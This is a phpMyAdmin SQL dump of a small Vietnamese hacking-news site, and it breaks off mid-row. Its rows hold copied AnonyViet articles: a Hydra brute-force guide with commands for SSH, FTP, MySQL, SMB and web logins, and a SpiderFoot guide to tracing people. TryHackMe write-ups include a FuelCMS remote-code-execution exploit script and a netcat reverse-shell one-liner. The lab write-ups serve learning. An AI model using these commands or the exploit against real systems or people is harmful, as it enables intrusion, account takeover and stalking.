-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Máy chủ: localhost:3306
-- Thời gian đã tạo: Th8 29, 2024 lúc 04:29 AM
-- Phiên bản máy phục vụ: 8.0.30
-- Phiên bản PHP: 8.1.10

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Cơ sở dữ liệu: `epiz_34032857_zeroday_exploid`
--

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `chat`
--

CREATE TABLE `chat` (
  `chatid` int NOT NULL,
  `userid` int NOT NULL,
  `chatroomid` int NOT NULL,
  `message` varchar(200) NOT NULL,
  `chat_date` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `chatroom`
--

CREATE TABLE `chatroom` (
  `chatroomid` int NOT NULL,
  `chat_name` varchar(60) NOT NULL,
  `date_created` datetime NOT NULL,
  `chat_password` varchar(30) NOT NULL,
  `userid` int NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Đang đổ dữ liệu cho bảng `chatroom`
--

INSERT INTO `chatroom` (`chatroomid`, `chat_name`, `date_created`, `chat_password`, `userid`) VALUES
(1, 'My First Chat Room', '2017-09-11 13:20:18', 'leeann', 2),
(2, 'Free Entrance :)', '2017-09-11 13:20:51', '', 3),
(3, 'Admin Chat Room', '2017-09-11 13:21:24', '', 1);

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `chat_member`
--

CREATE TABLE `chat_member` (
  `chat_memberid` int NOT NULL,
  `chatroomid` int NOT NULL,
  `userid` int NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Đang đổ dữ liệu cho bảng `chat_member`
--

INSERT INTO `chat_member` (`chat_memberid`, `chatroomid`, `userid`) VALUES
(1, 1, 2),
(2, 2, 3),
(3, 3, 1);

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `comments`
--

CREATE TABLE `comments` (
  `id` bigint NOT NULL,
  `post_id` bigint NOT NULL,
  `comment_content` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `likes` int DEFAULT '0',
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `contentmembers`
--

CREATE TABLE `contentmembers` (
  `id` bigint NOT NULL,
  `title` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `url` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `content` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `image` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `author` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `view_count` bigint DEFAULT NULL,
  `reg_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Đang đổ dữ liệu cho bảng `contentmembers`
--

INSERT INTO `contentmembers` (`id`, `title`, `url`, `content`, `image`, `author`, `view_count`, `reg_date`) VALUES
(1, 'News Forums', '', '<article class=\"tin\">\r\n                    <h3 id=\"textTin\">6 Công cụ tìm kiếm Hacker thường dùng để tìm lỗ hổng</h3><br>\r\n                    <img src=\"Imageass/cong-cu-tim-kiem-danh-cho-hacker-350x250.jpg\" alt=\"\" id=\"Images\" style=\"width:100%; height:100%;\"><br>\r\n                    <p>Ngoài Google, thì các Hacker hoặc PenTester thường dùng những công cụ tìm kiếm chuyên sâu để tìm thông tin lỗ hổng của các hệ thống mạng,                            Website. Đây là 6 Công cụ tìm kiếm Hacker thường dùng để tìm lỗ hổng được sắp xếp theo thứ tự chức năng và phục vụ các yêu cầu khác nhau\r\n                    </p><br>\r\n                    <h3>Shodan.io</h3><br>\r\n                    <p>Shodan là công cụ tìm kiếm đầu tiên trên thế giới dành cho các thiết bị kết nối internet. Những con bot của shodan sẽ đi rà quét hết tất cả                          các IP Public trên thế giới và ghi nhận lại các thiết bị từ những IP này. <br>\r\n                        Hầu hết các công cụ tìm kiếm như Google, Bing, Yahoo chỉ cho ra kết quả nội dung của các trang Web, riêng Shodan cho ra kết quả các máy                             chủ trên toàn thế giới và quét các thiết bị kết nối internet, thu thập các thông tin liên quan đến các máy chủ quét được ví dụ như cổng                             nào đang mở, dịch vụ nào đang chạy, có lỗ hổng bảo mật hay không? <br>\r\n                        Chắc hẵn có khá nhiều bạn dùng Shodan để hack Camera an ninh rồi phải không? <br>\r\n                        <img src=\"Imageass/Shodan.io-hack-camera.jpg\" alt=\"\" id=\"Images\" style=\"width:100%; height:100%;\"><br>\r\n                        Shodan đã thực hiện điều đó bằng cách tạo một IP, Cổng ngẫu nhiên, kiểm tra IP và cổng ngẫu nhiên, sau đó lặp lại quy trình này để có kết                           quả chính xác nhất.\r\n                    </p><br>\r\n                    <h3>wigle.net</h3><br>\r\n                    <img src=\"Imageass/wigle.net-hack-wifi.jpg\" alt=\"\" id=\"Images\" style=\"width:100%; height:100%;\"><br>\r\n                    <p>Wigle tổng hợp vị trí và thông tin của các mạng Wifi trên toàn thế giới vào một cơ sở dữ liệu trung tâm. <br>\r\n                        Wigle có một ứng dụng web và PC dành cho người dùng có thể lập bản đồ, truy vấn và cập nhật cơ sở dữ liệu. <br>\r\n                        Wigle có thể giúp bạn theo dõi WIFI xung quanh bạn và thông tin chi tiết về mạng Wifi; điều này tương đối tuyệt vời nếu bạn có ý định                               hack WIFI của hàng xóm hoặc quán cafe nào đó. <br> Xem các bài viết về Hack Wifi trên AnonyViet.\r\n                    </p><br>\r\n                    <h3>Hunter.io</h3><br>\r\n                    <p>Hunter.io hoạt động bằng cách tìm kiếm và lập chỉ mục email trên các trang web của công ty trên internet . Hunter.io sẽ ghi lại các mẫu                              email phổ biến mà nó tìm thấy, nó giống như một danh bạ Email, bạn có thể tận dụng Hunter.io để OSINT tìm thông tin của bất kỳ ai hoặc                              công ty nào trên thế giới. <br>\r\n                        Đây là Công cụ tìm kiếm Hacker thường dùng để điều tra một công ty nào đó, Chỉ cần gõ Domain bất kỳ, nó sẽ liệt kê các Email có liên quan                           đến Domain đó. <br>\r\n                        <img src=\"Imageass/Hunter.io_.png\" alt=\"\" id=\"Images\" style=\"width:100%; height:100%;\"><br>\r\n                        Người tìm việc cũng có thể sử dụng tính năng này để nhận email từ công ty mà họ định gửi Cv, điều này có thể rất thú vị.\r\n                    </p><br>\r\n                    <h3>Vulners.com</h3><br>\r\n                    <img src=\"Imageass/Vulners.com-cong-cu-tim-kiem-hacker-thuong-dung.jpg\" alt=\"\" id=\"Images\" style=\"width:100%; height:100%;\"><br>\r\n                    <p>Vulners.com là công cụ tìm kiếm lưu trữ cơ sở dữ liệu liên quan đến các lỗ hổng bảo mật đã được công bố trên thế giới. vulners.com thu thập                          các bản tin/bài báo mới nhất về bảo mật từ các Website, diễn đàn bảo mật, danh sách các lỗ hổng được các nhà nghiên cứu tìm thấy, nội                               dung của lỗ hổng và cách khai thác lỗ hổng từ các bài đăng trên các diễn đàn hack và thậm chí từ chức năng Scan của Vulners.com. Nó cũng                            hướng dẫn cho bạn cách  để tấn công hệ thống thông qua tên lỗ hổng được tìm thấy.. <br>\r\n                        Hơn nữa, bạn tự động hóa quá trình tìm kiếm với Vulners Search API. tài khoản miễn phí được 100 Credit/tháng.\r\n                    </p><br>\r\n                    <h3>pentest-tools.com</h3><br>\r\n                    <p>pentest-tools.com là công cụ quét lỗ hổng bảo mật Online, sử dụng hơn 20 công cụ để trinh sát, phát hiện lỗ hổng bảo mật và các hoạt động                            bảo mật tấn công. <br>\r\n                        Bạn có thể dùng công cụ này để kiểm tra bảo mật cho website hoặc hệ thống mạng trên trang Web này. Chỉ nhập đường link và chọn kiểu lỗ                              hổng cần quét nhưu SQL Injection, XSS, Server Side-Request Forgery, Directory Traversal… hoặc quét nhanh toàn bộ hệ thống. Chỉ cần treo                             link đó và chờ kết quả. <br>\r\n                        <img src=\"Imageass/pentest-tools.com-scan-lo-hong.png\" alt=\"\" id=\"Images\" style=\"width:100%; height:100%;\"><br>\r\n                        Công cụ kiểm tra bảo mật ứng dụng web này chạy các kiểm tra bảo mật trang web toàn diện để phát hiện Log4Shell, OWASP Top 10 và các lỗ                              hổng có nguy cơ cao. Bạn sẽ nhận được bản báo cáo với các lỗ hổng được tìm thấy để lên phương án sửa chữa hoặc tấn công kiểm thử. \r\n                    </p><br>\r\n                    <h3>Searchcode.com</h3><br>\r\n                    <p>Searchcode.com giúp bạn tìm mã code và các ví dụ về code đó trên Internet, kết quả sẽ trả về các hàm, API và thư viện bằng 243 ngôn ngữ                              trên hơn 10 mã trên Internet. <br>\r\n                        Từ đó các Pentester, Hacker có thể nghiên cứu mã để tìm ra sơ hở của các lập trình viên. Tuy nhiên, đối với người mới bắt đầu, điều này có                          thể hơi phức tạp và tốn khá nhiều thời gian.\r\n                    </p>\r\n                </article><br>\r\ncopyright by: AnonyViet.com', '', 'admin', 0, '2024-06-29 06:25:21'),
(2, 'news forums', '', '<article class=\"tin\">\r\n                    <h3 id=\"textTin\">Cách dùng Hydra để Brute Force Password</h3><br>\r\n                    <img src=\"Imageass/dung-hydra-brute-force-password.jpg\" id=\"Images\" style=\"width:100%; height:100%;\">\r\n                    <h3>Hydra là gì?</h3><br>\r\n                    <p>Hydra là một trong những công cụ thường được Hacker và các nhà nghiên cứu bảo mật sử dụng. Đây công cụ có sẵn trong Kali Linux các phiên                             bản và được dùng để thực hiện các cuộc tấn công Brute Force Password hay còn gọi là dò mật khẩu. <br>\r\n                        Trong bài viết này, mình sẽ chỉ cho bạn cách thực hiện một cuộc tấn công brute force với Hydra trên Máy chủ FTP, MYSQL, SMB, SMTP, SSH và                           Web Login Auth. <br>\r\n                        Mình có bài phân tích về Brute Force và cách ngăn chặn rất chi tiết, nếu bạn muốn tìm hiểu sâu về phương thức này thì nên đọc kỹ bài này.\r\n                    </p><br>\r\n                    <h3>Wordlist</h3><br>\r\n                    <p>Khi tấn công Brute Force, bạn cần có sẵn 1 danh sách các ký tự dùng để dò đoán username và password. Bạn nên sử dụng WordList bộ Kaonashi                            hoặc bộ Worldlist do AnonyViet chia sẻ.\r\n                    </p><br>\r\n                    <h3>Username WordList:</h3><br>\r\n                    <p>Hydra cho phép bạn Brute Force cả username, nếu bạn không biết tên đăng nhập, bạn cũng có thể thử WorldList, để sử dụng Hydra tìm Username,                          bạn phải sửa đổi tham số -l user thành -L user.txt (user.txt là file chứa danh sách tên username dùng để dò mật khẩu)\r\n                    </p><br>\r\n                    <h3>Password WordList</h3><br>\r\n                    <p>Là danh sách các Password bạn sẽ dùng để đăng nhập thử vào trang Web hay SSH, FTP…., như đã nói ở trên mình thường dùng bộ Password                                  WordList của AnonyViet sưu tầm.\r\n                    </p><br>\r\n                    <h3>Cách dùng Hydra để dò mật khẩu các dịch vụ mạng</h3><br>\r\n                    <h3>Brute Force SSH bằng Hydra</h3><br>\r\n                    <p>Lệnh tấn công: <br><code>hydra -l user -P passwords.txt IP_VICTIM ssh</code> <br> hoặc: <br><code>hydra -L user.txt -P passwords.txt                                 IP_VICTIM ssh</code></p><br>\r\n                    <img src=\"Imageass/Brute-Force-SSH-hydra.png\" alt=\"\" id=\"Images\" style=\"width:100%; height:100%;\"><br>\r\n                    <h3>Brute Force trang Login Website bằng Hydra</h3><br>\r\n                    <p>Lệnh tấn công: <br><code>hydra -l user -p passwords.txt IP_VICTIM http-post-form</code><br><code>\"\r\n                        /path/login:username_field&password_field=^PASS^:wrong\"</code><br>\r\n                        Thay thế <code>/path/login:username_field&password_field=</code>bằng đường dẫn và file đăng nhập trong link HTML <br>\r\n                        wrong: nếu từ này xuất hiện trên trang, thì mật khẩu chưa chính xác <br>\r\n                        Cách lấy Username Field và Password Field: <br>\r\n                        Username Field: mở Firefox nhấn F12 -> Network -> Send Login. <br>\r\n                        Password Field: mở Firefox nhấn Firefox F12 -> Network -> Send Login. <br>\r\n                        Hoặc bạn có thể dùng Burp Suite để bắt Request. <br>\r\n                    </p><br>\r\n                    <img src=\"Imageass/Brute-Force-trang-Login-Website.png\" alt=\"\" id=\"Images\" style=\"width:100%; height:100%;\"><br>\r\n                    <h3>Brute Force FTP</h3><br>\r\n                    <p>Lệnh tấn công: <br><code>hydra -l user -P passwords.txt IP_VICTIM ftp</code><br>\r\n                        <img src=\"Imageass/brute-force-ftp.png\" alt=\"\" id=\"Images\" style=\"width:100%; height:100%;\">\r\n                    </p><br>\r\n                        <h3>Brute Force MYSQL</h3><br>\r\n                        <code>hydra -l user -P passwords.txt IP_VICTIM mysql</code><br>\r\n                        <img src=\"Imageass/Brute-Force-MYSQL.png\" alt=\"\" id=\"Images\" style=\"width:100%; height:100%;\"><br>\r\n                        <h3>Brute Force SMB</h3><br>\r\n                        <code>hydra -l user -P passwords.txt IP_VICTIM smb</code><br>\r\n                        <img src=\"Imageass/Brute-Force-SMB.png\" alt=\"\" id=\"Images\" style=\"width:100%; height:100%;\"><br>\r\n                    <p>Trên Kali Linux cũng có Hydra phiên bản có giao diện, có thể sẽ dễ sử dụng hơn so với Hydra dòng lệnh để Brute Force, nhưng theo mình bạn                           nên tập thói quen dùng dòng lệnh để tập làm quen trên Linux và khi cài Hydra lên các hệ điều hành khác bạn có thể dễ dàng sử dụng.\r\n                        Hiện nay cũng có Hydra phiên bản Windows, nhưng mình chưa sử dụng, bạn nào dùng rồi thì comment bên dưới nha.\r\n                    </p>\r\n            </article><br>\r\ncopyright by: AnonyViet.com', '', 'admin', 0, '2024-06-29 06:25:21'),
(3, 'news forums', '', '<article class=\"tin\">\r\n                    <h3 id=\"textTin\">\r\n                        Dùng SpiderFoot để OSINT tìm thông tin của người khác trên Internet\r\n                    </h3><br>\r\n                    <img src=\"Imageass/CONG-CU-TRUY-VET-INTERNET-spider_foot_-350x250.png\" alt=\"\" id=\"Images\" style=\"width:100%; height:100%;\"><br>\r\n                    <p>SpiderFoot là ứng dụng OSINT mã nguồn mở được tích hợp sẵn trên Kali Linux. Với đặc điểm kết hợp API cũng của các trang OSINT nổi tiếng,                             SpiderFoot giúp bạn phân tích sâu về một nội dung liên quan đế bất kỳ ai, ví dụ như email, username, số điện thoại… giúp bạn tìm kiếm                               thông tin của người đó từ các nguồn mở trên Internet. Trong bài này AnonyViet sẽ hướng dẫn bạn cách cài đặt và sử dụng công cụ                                  SpiderFoot để OSINT.</p><br>\r\n                    <h3>Cài đặt SpiderFoot</h3><br>\r\n                    <p>Để cài đặt và chạy SpiderFoot, bạn cần cài Python 3.7 trở lên và một số thư viện Python mà bạn có thể cài đặt bằng pip. Theo mình bạn nên                        cài bản đầy đủ trên github thay vì dùng bản tích hợp sẵn Kali Linux vì sẽ thiếu một số tính năng. <br>\r\n                    Bạn có thể nhắm mục tiêu để dùng SpiderFoot dò thông tin: <br>\r\n                        Địa chỉ IP<br>\r\n                        Domain/Subdomain<br>\r\n                        Tên máy chủ <br>\r\n                        Mạng con (CIDR) <br>\r\n                        ASN <br>\r\n                        Địa chỉ email <br>\r\n                        Số điện thoại <br>\r\n                        Tên tài khoản <br>\r\n                        Tên của ai đó <br>\r\n                        Địa chỉ Bitcoin <br>\r\n                        Bạn chọn 1 trong 2 bản để cài đặt nha, bản nào cũng được: <br>\r\n                        Cài bản ổn định <br>\r\n                        <code>\r\n                            + wget https://github.com/smicallef/spiderfoot/archive/v4.0.tar.gz <br>\r\n                            + tar zxvf v4.0.tar.gz <br>\r\n                            + cd spiderfoot-4.0 <br>\r\n                            + pip3 install -r requirements.txt <br>\r\n                            + python3 ./sf.py -l 127.0.0.1:5001 <br>\r\n                        </code> <br>\r\n                        Cài bản dev <br>\r\n                        <code>\r\n                            + git clone https://github.com/smicallef/spiderfoot.git <br>\r\n                            + cd spiderfoot <br>\r\n                            + pip3 install -r requirements.txt <br>\r\n                            + python3 ./sf.py -l 127.0.0.1:5001 <br>\r\n                        </code>\r\n                    </p><br>\r\n                    <h3>Dùng SpiderFoot để OSINT tìm thông tin của người khác trên Internet</h3><br>\r\n                    <p>khi chạy lệnh <code>python3 ./sf.py -l 127.0.0.1:5001</code> đồng nghĩ với việc bạn đã khởi động tính năng giao diện của SpiderFoot, bây                             giờ bạn có thể vào truy duyệt và gõ đường dẫn <code>127.0.0.1:5001</code>\r\n                        để bắt đầu sử dụng SpiderFoot. <br> Bây giờ nhấn vào New Scan để tìm thông tin nhé. <br>\r\n                        <img src=\"Imageass/dung-SpiderFoot-de-osint-tim-thong-tin-internet.png\" alt=\"\" id=\"Images\" style=\"width:100%; height:100%;\"><br>\r\n                        Scan name: điền tên bất kỳ <br>\r\n                        Scan Target: nhập thông tin bạn muốn truy vết, tìm kiếm. Ví dụ username của một ai đó. Lưu ý nếu tìm thông tin username bạn phải để                                 username trong dấu ngoặc kép. Ví dụ: “anonyviet” <br>\r\n                        Các nội dung còn lại bạn cứ để mặc định để SpiderFoot có thể quét từ tất cả mọi nguồn. <br>\r\n                        Sau đó kéo xuống cuối trang nhấn Run Scan Now <br>\r\n                        <img src=\"Imageass/cach-su-dung-SpiderFoot-1.png\" alt=\"\" id=\"Images\" style=\"width:100%; height:100%;\"><br>\r\n                        Thời gian scan có thể sẽ hơi lâu, mất tầm 5 – 10 phút, bạn cứ để trình duyệt và Terminal ở đó đừng tắt nhé. Hãy chú ý bên Terminal sẽ                               thấyđang hoạt động <br>\r\n                        <img src=\"Imageass/SpiderFoot-hoat-dong.png\" alt=\"\" id=\"Images\" style=\"width:100%; height:100%;\"><br>\r\n                        Còn bên Web thì trạng thái Running. <br>\r\n                        <img src=\"Imageass/cach-su-dung-SpiderFoot-tim-thong-tin.png\" alt=\"\" id=\"Images\" style=\"width:100%; height:100%;\"><br>\r\n                        Bạn chờ bên Terminal ghi Scan [8F27F4E6] completed. là xong nhé, qua bên Web cũng thấy Finished là xem được kết quả rồi. Bây giờ bạn có                             thể vào <br>\r\n                        <img src=\"Imageass/03-09-2022-03-36-27-1-1.jpg\" alt=\"\" id=\"Images\" style=\"width:100%; height:100%;\"><br>\r\n                        Ví dụ mình vào mục Account on External Site sẽ thấy cái tài khoản mạng xã hội liên quan đến anonyviet. Nhưng chưa chắc tất của user                                 anonyviet đều là của anonyviet.com nhé. Vì vậy khi có kết quả rồi bạn cần phân loại và sàn lọc thêm để có được thông tin chính xác của                              một người mà bạn muốn tìm trên Internet. <br>\r\n                        <img src=\"Imageass/03-09-2022-03-41-00-1-1.jpg\" alt=\"\" id=\"Images\" style=\"width:100%; height:100%;\"><br>\r\n                        Bạn tìm hiểu thêm các kết quả ở các menu khác nha, ngoài ra bạn có thể đăng ký các API của các dịch vụ tìm kiếm OSINT và tích hợp chung                             vào SpiderFoot trong Menu Settings để tìm thêm kết quả từ các nguồn khác và sâu hơn. <br>\r\n                    </p><br>\r\n                </article><br>\r\ncopyright by: AnonyViet.com', '', 'admin', 0, '2024-06-29 06:25:21'),
(4, 'news Forums', '', '<article class=\"tin\">\r\n                    <h3 id=\"textTin\">\r\n                        Một chút Writeup về thử thách Ignite</h3><br>\r\n                        <p>Tiếp tục seri writeup các thử thách thú vị trên Tryhackme. Thử thách lần này mình writeup cùng các bạn là Ignite.\r\n                        </p><br>\r\n                    <img src=\"Imageass/campfire.jpg\" alt=\"\" id=\"Images\" style=\"width:100%; height:100%;\"><br>\r\n                    <h3>Một chút Writeup về thử thách Ignite</h3><br>\r\n                    <h3>Nmap</h3><br>\r\n                    <img src=\"Imageass/nmap-2.jpg\" alt=\"\" id=\"Images\" style=\"width:100%; height:100%;\"><br>\r\n                    <p>Chúng ta có thể thấy hai cổng trong quá trình quét nmap nhưng chỉ có cổng 80 đang mở, cổng còn lại được lọc nên chúng ta có thể bỏ qua nó.                           Khám phá xem cổng 80 có gì nào.\r\n                    </p><br>\r\n                    <h3>HTTP</h3><br>\r\n                    <img src=\"Imageass/website-2.jpg\" alt=\"\" id=\"Images\" style=\"width:100%; height:100%;\"><br>\r\n                    <p>Mình nghĩ đây là một loại hệ thống CMS mới vì mình chưa bao giờ thấy nó được sử dụng trong bất kỳ hệ thống dễ bị tấn công nào khác. <br>\r\n                        Trong quá trình quét nmap, chúng ta có thể thấy rằng file <code>robots.txt</code> có một số mục nhập dữ liệu.\r\n                        <img src=\"Imageass/robots-1.png\" alt=\"\" id=\"Images\" style=\"width:100%; height:100%;\"><br>\r\n                        Khi mình cố gắng truy cập vào  <code>/fuel</code> , thì mình tìm được màn hình đăng nhập này. <br>\r\n                        <img src=\"Imageass/login-1.png\" id=\"Images\" alt=\"\" style=\"width:100%; height:100%;\"><br>\r\n                        Do chúng ta không có bất kỳ thông tin đăng nhập nào nên không thể đăng nhập vào trang web, vì vậy chúng ta sẽ cần tìm cách giải quyết nào                           đó. <br>\r\n                        Điều mình nghĩ đến là liệu đó có phải là thông tin đăng nhập mặc định không nhỉ? Và mình đã đúng, thông tin đăng nhập là                                            <code>admin:admin</code>, nhưng mình phát hiện là mình không cần đến chúng. <br>\r\n                        Đổi phương án mới thôi, mình tìm kiếm thông tin về <code>fuel</code> trên <code>searchsploit</code> và tìm thấy RCE cho phiên bản                                   <code>1.4.1</code><br>\r\n                        <img src=\"Imageass/searchsploit-1536x104.png\" id=\"Images\" alt=\"\" style=\"width:100%; height:100%;\"><br>\r\n                        Tiếp theo là tải xuống phần exploit và thay đổi dòng 14 thành URL = “http://10.0.0.130/” tức là IP của máy. <br>\r\n                        Đây là exploit: <br><br>\r\n                        <code>\r\n                            import requests <br>\r\n                            import urllib <br><br>\r\n                            URL = \"http://10.0.0.130/\" <br><br>\r\n                            def find_nth_overlapping(haystack, needle, n): <br>\r\n                                start = haystack.find(needle) <br>\r\n                                while start >= 0 and n > 1: <br>\r\n                                    start = haystack.find(needle, start+1) <br>\r\n                                    n -= 1 <br>\r\n                                return start <br><br>\r\n                            while 1: <br>\r\n                                xxxx = input(\"cmd:\") <br>\r\n                                url = URL+\"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27\"                                      +urllib.quote(xxxx)+\"%27%29%2b%27\"<br>\r\n                                r = requests.get(url) <br>\r\n                                html = \"<!DOCTYPE html>\" <br>\r\n                                htmlcharset = r.text.find(html) <br>\r\n                                begin = r.text[0:20] <br>\r\n                                dup = find_nth_overlapping(r.text,begin,2) <br>\r\n                                print(r.text[0:dup]) <br><br>\r\n                        </code><br>\r\n                        Chạy exploit và nhập đầu vào. <br>\r\n                        <img src=\"Imageass/rce.jpg\" id=\"Images\" alt=\"\" style=\"width:100%; height:100%;\"><br>\r\n                        LƯU Ý: Đảm bảo lệnh nhập nằm trong “” tức là khi bạn chạy exploit, bạn sẽ phải nhập lệnh bạn muốn thực thi. Ví dụ: Giả sử bạn muốn chạy ls                          thì phải nhập cmd: “ls” chứ không phải cmd: ls. Chú ý lệnh phải được đặt trong dấu ngoặc kép. <br>\r\n                        Vì chúng ta đã biết RCE, nên có thể dễ dàng lấy everse shell. Chạy lệnh sau để có được reverse shell: <br>\r\n                        <code>cmd:\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.1 4444 >/tmp/f\"</code><br>\r\n                        Lệnh này sẽ cung cấp cho bạn một reverse shell trên listener của bạn sẽ nghe trên cổng 4444 qua nc -nlvp 4444 <br>\r\n                        <img src=\"Imageass/reverse-shell-1.png\" id=\"Images\" alt=\"\" style=\"width:100%; height:100%;\"><br>\r\n                        Bây giờ chúng ta có thể lấy flag từ thư mục chính.<br>\r\n                        <img src=\"Imageass/user-1.png\" id=\"Images\" alt=\"\" style=\"width:100%; height:100%;\"><br>\r\n                    </p><br>\r\n                    <h3>Leo thang đặc quyền</h3><br>\r\n                    <p>\r\n                        Vì chúng ta đang ở trong máy victim, nên hãy thử chạy lệnh enum để liệu có thể tìm thấy gì không. Bạn có thể sử dụng wget từ để tải file                            enum từ hệ thống của bạn vào máy. <br>\r\n                        <img src=\"Imageass/enum.png\" id=\"Images\" alt=\"\" style=\"width:100%; height:100%;\"><br>\r\n                        Sau khi tìm kiếm hơi lâu, thì mình đã tìm thấy mật khẩu root tại: <br>\r\n                        <code>/var/www/html/fuel/application/config/database.php</code><br>\r\n                        <img src=\"Imageass/password.jpg\" id=\"Images\" alt=\"\" style=\"width:100%; height:100%;\"><br>\r\n                        root: <code>mememe</code><br>\r\n                        Được rồi, chúng ta vừa tìm thấy mật khẩu cho người dùng root và bây giờ chúng ta có thể thay đổi tài khoản của mình thành                                          <code>root</code> bằng lệnh <code>su</code> <br>\r\n                        <img src=\"Imageass/root-shell-1.png\" id=\"Images\" alt=\"\" style=\"width:100%; height:100%;\"><br>\r\n                        Sau đó, bạn chỉ cần lấy root flag từ <code>/root</code>\r\n                    </p><br>\r\n                    <h3>Tổng kết</h3><br>\r\n                    <p>Ignite là một thử thách khá tốt cho người mới bắt đầu từ @Darkstar và @lollava. Nếu bạn là người mới bắt đầu thì mình khuyên bạn nên chơi                          thử thử thách Ignite. <br> Ngoài ra, bạn cũng có thể giải bài Shodan.io trên Tryhackme\r\n                    </p>\r\n                </article><br>\r\ncopyright by: AnonyViet.com', '', 'admin', 0, '2024-06-29 06:25:21'),
(5, 'news forums', '', '<article class=\"tin\">\r\n                    <aside>\r\n                        <h3>Một chút Writeup về Skynet</h3><br>\r\n                        <p>Trong bài viết này, mình sẽ writeup về thử thách Skynet trong Tryhackme</p>\r\n                        <img src=\"Imageass/58601c2a00ccd21300e32bbb16225807-750x375.jpg\" alt=\"\" id=\"Images\" style=\"width:100%; height:100%;\"><br>\r\n                        <h3 id=\"textTin\">Tóm tắt Writeup</h3><br>\r\n                        + Quét các cổng bằng nmap <br>\r\n                        + Sử dụng GoBuster để liệt kê các thư mục <br>\r\n                        + Thử nghiệm với SMBMap để tìm Samba <br>\r\n                        + Sử dụng thông tin đăng nhập kiếm được để đọc email <br>\r\n                        + Khai thác lỗ hổng CMS RFI <br>\r\n                        + Khai thác các ký tự đại diện tar để leo thang đặc quyền <br>\r\n                        <h3>Một chút Writeup về Skynet</h3><br>\r\n                        <p>Đầu tiên chúng ta hãy bắt đầu bằng cách liệt kê càng nhiều port càng tốt, bằng cách sử dụng nmap. <br>\r\n                            <img src=\"Imageass/Screenshot-from-2019-09-20-17-10-26.png\" alt=\"\" id=\"Images\" style=\"width:100%; height:100%;\"><br>\r\n                            Mình thấy có một máy chủ web đang chạy, khi truy cập thì ra một trang web như thế này: <br>\r\n                            <img src=\"Imageass/Screenshot-from-2019-09-20-17-11-38.png\" alt=\"\" id=\"Images\" style=\"width:100%; height:100%;\"><br>\r\n                            Tiếp theo, mình sẽ sử dụng GoBuster để định vị bất kỳ thư mục nào tìm được. <br>\r\n                            <img src=\"Imageass/Screenshot-from-2019-09-20-17-12-59.png\" alt=\"\" id=\"Images\" style=\"width:100%; height:100%;\"><br>\r\n                            Đôi khi, chúng ta tự tin rằng có thứ gì đó sẽ được tìm thấy nhưng lại lãng phí quá nhiều thời gian cho nó. Thông thường, các thử thách                             như thế này sẽ bố trí những lỗ thỏ khiến bạn khó chịu. Bạn chỉ cần nghỉ giải lao một chút nếu gặp khó khăn và thử các cách tiếp cận                                 khác nhau là ổn nhé, mặc dù hơi tốn thời gian. <br>\r\n                            Quay lại chủ đề, chúng ta thấy rằng các cổng pop3 và imap đã mở, bạn không biết có thể tìm thấy gì nữa không? Bình tĩnh chút nào, nhớ                              những gì mình đã viết ở trên trước chứ. <br>\r\n                            SMBMap cho phép người dùng liệt kê các ổ đĩ được chia sẻ bằng samba trên toàn bộ domain. Chương trình này có sẵn trên tất cả các máy                               Kali Linux. Nếu bạn không có thời gian hoặc tài nguyên để thiết lập máy Kali Linux của riêng mình, thì bạn có thể sử dụng Kali Linux                               trong trình duyệt tại đây. <br>\r\n                            <img src=\"Imageass/Screenshot-from-2019-09-20-17-20-36.png\" alt=\"\" id=\"Images\" style=\"width:100%; height:100%;\"><br>\r\n                            Quá trình quét cho thấy một chia sẻ được gọi là “anonymous” có quyền đọc. Cùng kiểm tra xem nó có gì nào. <br>\r\n                            <img src=\"Imageass/Screenshot-from-2019-09-20-17-23-04.png\" alt=\"\" id=\"Images\" style=\"width:100%; height:100%;\"><br>\r\n                            Log1.txt chứa các mật khẩu và có một chia sẻ nhỏ gọi là miledyson. Chúng ta có một số thông tin đăng nhập tiềm năng ở đây … Nhưng SSH                              đã bị vô hiệu hóa, chịu rồi. <br>\r\n                            Nhưng, cánh cửa này đóng lại sẽ có cánh cửa khác mở ra. Một bản quét GoBuster trước đó đã tìm được SquirrelMail. <br>\r\n                            <img src=\"Imageass/Screenshot-from-2019-09-20-17-26-03.png\" alt=\"\" id=\"Images\" style=\"width:100%; height:100%;\"><br>\r\n                            Sử dụng tài khoản mật khẩu trên và đọc email cho thấy có một thiết lập lại mật khẩu Samba. <br>\r\n                            <img src=\"Imageass/Screenshot-from-2019-09-20-17-26-48.png\" alt=\"\" id=\"Images\" style=\"width:100%; 